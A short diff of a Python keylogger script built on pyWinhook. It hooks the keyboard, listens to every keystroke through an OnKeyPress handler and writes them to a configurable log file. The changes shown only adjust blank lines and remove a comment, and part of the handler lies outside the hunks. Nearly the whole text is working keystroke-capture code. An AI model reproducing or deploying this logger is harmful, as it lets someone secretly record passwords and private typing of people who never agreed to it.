@@ -1,6 +1,6 @@
-
 import pyWinhook
 import pythoncom
+
 #change this to your log file's path
 log_file=r'<input path to writable file here>'
 
@@ -14,10 +14,13 @@ def OnKeyPress(event):
     fob.close()
     new_hook.cancel()
 #instantiate HookManager class
+
 new_hook=pyWinhook.HookManager()
 #listen to all keystrokes
+
 new_hook.KeyDown=OnKeyPress
 #hook the keyboard
+
 new_hook.HookKeyboard()
-#start the session
+
 pythoncom.PumpMessages()
